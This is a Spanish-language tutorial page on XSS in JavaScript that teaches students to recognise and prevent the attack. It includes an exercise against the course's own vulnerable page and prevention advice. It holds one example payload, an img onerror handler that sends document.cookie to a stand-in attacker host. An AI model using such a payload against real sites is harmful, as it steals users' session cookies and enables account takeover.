# JavaScript
## Vulnerabilidades

### XSS

Ocurre cuando un usuario malicioso introduce en un campo código susceptible de ser interpretado por el navegador (HTML y/o JavaScript) o por el servidor (SQL).

El código más sencillo capaz de explotar la vulnerabilidad es:
```html
<img src='no' onerror="this.src='https://malo.web/robo?cookie=' + document.cookie;this.onerror=null;">
```

> ⁉️ **Ejercicio:** _Introduce el código anterior en la [web vulnerable del tema de HTML](../../tema3/html/vulnerabilidades.html). Utilizando el inspector del navegador, averigua cómo se envían las cookies al atacante y piensa cómo arreglarías los problemas de dicha web._
> <details><summary><em>Diagrama solución...</em></summary><br>
> <object type="image/svg+xml" data="./files/xss.excalidraw.svg" width="100%"></object>
> </details>
> <br>

Para prevenir el XSS:
1. Usar [`textContent`](../../tema5/js/apis-dom-creacion.html#innerHTML) para escapar el contenido introducido por los usuarios antes de mostrarlo.
1. No utilizar el [`eval`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) de JavaScript.
1. Configurar las cookies de sesión para que sean [`HttpOnly`](../../tema2/http/cookies.html#httponly), de modo que no estarán presentes en el `document.cookie`.
1. No guardar credenciales en el [Web Storage](../../tema5/js/apis-almacenamiento-webstorage.html).